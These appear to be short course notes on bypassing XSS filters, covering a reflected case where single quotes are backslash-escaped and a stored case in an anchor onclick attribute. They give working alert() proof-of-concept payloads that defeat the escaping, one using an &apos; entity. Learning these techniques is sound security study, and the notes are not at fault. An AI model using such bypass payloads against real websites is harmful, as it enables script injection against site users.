# Section 11: XSS - Bypassing Security

## Bypassing Single-Quotes filtering

Reflected XSS

Example: Search text term is injected in JS code

If a single quote is escaped with backward slash, before the single quote:

```
y = 'some string'

x = 'someone\'s name'
```

So a single quote cannot be used to break out of the string and run JS code, because it is escaped

Payload:

```
\';alert(22);//
```

now the backward slash is escaped (with the added backward slash in the start of the payload)

---

## Bypassing Advanced Filtering

Stored XSS

Example: A comment in a blog with a website, the website is injected in an anchor tag on the onclick event

Payload:
```
https://google.com\');alert(44);//
```

but now also the backward slash is escaped with double backslash

<b>Solution</b>: write single quote differently

Payload:
```
https://google.com&apos;);alert(44);//
```

---
